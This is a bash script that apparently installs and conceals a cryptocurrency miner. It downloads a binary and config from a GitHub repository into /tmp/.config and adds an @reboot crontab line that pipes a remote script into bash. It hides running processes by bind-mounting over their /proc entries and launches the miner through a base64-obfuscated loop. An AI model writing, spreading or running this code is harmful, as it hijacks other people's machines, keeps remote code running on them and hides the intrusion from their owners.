#!/bin/bash

mode="${1:-0}"
work="/tmp/.config"
src="https://raw.githubusercontent.com/hanrzme/canuqw/main"
hugepage="128"


name=`TZ=":Asia/Shanghai" date '+%Y%m%d'`
[ -n "$name" ] || name="NULL"
name="${name}"

cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
[ -n "$cores" ] || cores=1
# [ "$cores" -gt "2" ] && rx="[`seq -s ', ' 0 $((cores - 2))`]" || rx=""
[ "$cores" -gt "32" ] && rx="[`seq -s ', ' 1 $((cores - 1))`]" || rx=""

hPid() {
  [ -d "/proc/$1" ] && [ ! -d "/tmp/.proc/$1" ] && mkdir -p "/tmp/.proc/$1" && mount -o bind "/tmp/.proc/$1" "/proc/$1" && return 0 || return 1
}

sudo sysctl -w vm.panic_on_oom=1 >/dev/null 2>&1 || sysctl -w vm.panic_on_oom=1 >/dev/null 2>&1
sudo sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1
sudo sed -i "/^@reboot/d;\$a\@reboot root wget --no-check-certificate -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1 || sed -i "/^@reboot/d;\$a\@reboot root wget --no-check-certificate -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1

rm -rf "${work}"; mkdir -p "${work}";
wget --no-check-certificate -qO "${work}/config.json" "${src}/idle.json"
wget --no-check-certificate -qO "${work}/idle" "${src}/idle"
[ -f "${work}/config.json" ] && [ -n "$name" ] && sed -i "s/\"pass\":.*,/\"pass\": \"${name}\",/g" "${work}/config.json"
[ -f "${work}/config.json" ] && [ -n "$rx" ] && sed -i "s/\"max-threads-hint\": 100,/&\n        \"rx\": ${rx},/" "${work}/config.json"
chmod -R 777 "${work}"


hPid "$$"
sh <(echo 'd2hpbGUgdHJ1ZTsgZG8KICBuaWNlIC1uIDE5IC90bXAvLmNvbmZpZy9pZGxlIC1jIC90bXAvLmNvbmZpZy9jb25maWcuanNvbiA+L2Rldi9udWxsIDI+JjEgJgogIHBpZD0iJCEiCiAgbWtkaXIgLXAgIi90bXAvLnByb2MvJHBpZCIgJiYgbW91bnQgLW8gYmluZCAiL3RtcC8ucHJvYy8kcGlkIiAiL3Byb2MvJHBpZCIKICB3YWl0ICIkcGlkIgpkb25lCg==' |base64 -d) &
hPid "$!"
[ "$mode" == "1" ] && wait
